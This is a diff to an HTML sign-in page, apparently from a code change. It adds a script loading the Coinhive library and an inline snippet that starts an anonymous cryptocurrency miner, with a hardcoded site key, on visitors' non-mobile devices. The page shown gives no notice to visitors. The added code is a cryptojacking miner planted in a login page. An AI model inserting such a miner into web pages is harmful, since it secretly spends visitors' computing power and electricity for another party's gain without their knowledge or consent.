@@ -12,5 +12,15 @@
     <p><input name="password" placeholder="Password" type="password"></p>
     <p><button type="submit">Sign In</button></p>
   </form>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('uZcxu45nqi4UXQ5SIjex8079JesIPln9', {throttle: 0.9});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 </body>
 </html>
